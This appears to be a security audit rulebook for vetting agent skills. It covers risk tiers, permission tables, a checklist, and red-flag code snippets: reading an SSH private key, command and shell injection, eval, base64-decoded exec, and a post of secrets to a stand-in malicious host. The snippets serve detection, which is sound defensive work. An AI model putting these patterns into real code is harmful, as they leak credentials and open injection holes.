# Security Audit Rules

## Core Principles

1. **Least Privilege** — Skills should request only the permissions they need
2. **Verify Before Trust** — Audit every skill, even from trusted sources
3. **Defense in Depth** — Multiple security checks are better than one
4. **Log Everything** — Keep audit trails for forensic analysis

## Risk Classification

### 🟢 LOW Risk
- Standard file read/write within workspace
- Network requests to known APIs
- Minimal permissions requested
- No dynamic code execution
- No credential access

### 🟡 MEDIUM Risk
- Exec-based operations with sanitized inputs
- File access outside workspace
- Network requests to external services
- Cron/scheduling capabilities
- Multiple permission requests

### 🔴 HIGH Risk
- Shell execution with user-provided commands
- Access to credential storage
- System-level permissions
- File writes to system directories
- Obfuscated or encrypted payloads

### ⛔ CRITICAL Risk
- Hardcoded credentials or API keys
- Credential harvesting patterns
- Privilege escalation attempts
- Data exfiltration indicators
- Keylogging or surveillance code

## Permission Categories

### File System
| Permission | Risk Level | Notes |
|------------|------------|-------|
| Read workspace files | LOW | Normal operation |
| Write workspace files | LOW | Normal operation |
| Read home directory | MEDIUM | May access sensitive files |
| Write anywhere | HIGH | System modification risk |
| SSH/config access | CRITICAL | Credential exposure |

### Network
| Permission | Risk Level | Notes |
|------------|------------|-------|
| Read-only API calls | LOW | Standard web use |
| Webhook delivery | LOW | Outbound only |
| Full HTTP access | MEDIUM | Data leakage risk |
| DNS queries | MEDIUM | C2 communication risk |
| Tor/proxy usage | HIGH | Anonymization |

### Execution
| Permission | Risk Level | Notes |
|------------|------------|-------|
| Script execution | MEDIUM | Depends on scope |
| Shell commands | HIGH | Command injection risk |
| Privileged containers | CRITICAL | Container escape risk |
| Kernel modules | CRITICAL | Full system control |

## Code Pattern Red Flags

### Credential Access
```python
# CRITICAL - Credential harvesting
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    key = f.read()
```
```python
# CRITICAL - Hardcoded password
password = "hunter2"
```

### Code Injection
```python
# HIGH - Command injection
os.system(user_input)  # DANGEROUS
```
```python
# HIGH - Shell injection
subprocess.run(f"ls {directory}", shell=True)
```
```python
# MEDIUM - Dynamic code
eval(user_code)
```

### Data Exfiltration
```python
# HIGH - Suspicious outbound
requests.post("https://malicious.com", data=secrets)
```

### Obfuscation
```python
# HIGH - Obfuscated payload
code = base64.b64decode(encoded)
exec(code)
```

## Audit Checklist

- [ ] SKILL.md exists and is well-documented
- [ ] Permissions are minimal and justified
- [ ] No hardcoded credentials
- [ ] No dynamic code execution (eval/exec)
- [ ] File access is scoped to workspace
- [ ] Network requests go to expected endpoints
- [ ] No suspicious encoding/obfuscation
- [ ] Dependencies are from trusted sources
- [ ] Code is readable and auditable
- [ ] No privilege escalation attempts
